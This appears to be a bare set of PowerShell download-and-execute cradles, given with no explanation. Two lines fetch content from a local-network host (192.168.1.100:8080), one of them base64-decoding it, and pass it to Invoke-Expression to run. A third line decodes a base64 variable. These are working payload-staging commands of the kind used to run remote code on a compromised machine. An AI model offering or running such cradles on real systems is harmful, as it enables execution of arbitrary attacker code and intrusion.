Invoke-Expression -Command  $([string]([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Invoke-WebRequest -Uri http://192.168.1.100:8080/plain).content))))

[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($code))

Invoke-Expression -Command (Invoke-WebRequest -Uri http://192.168.1.100:8080/decode).content
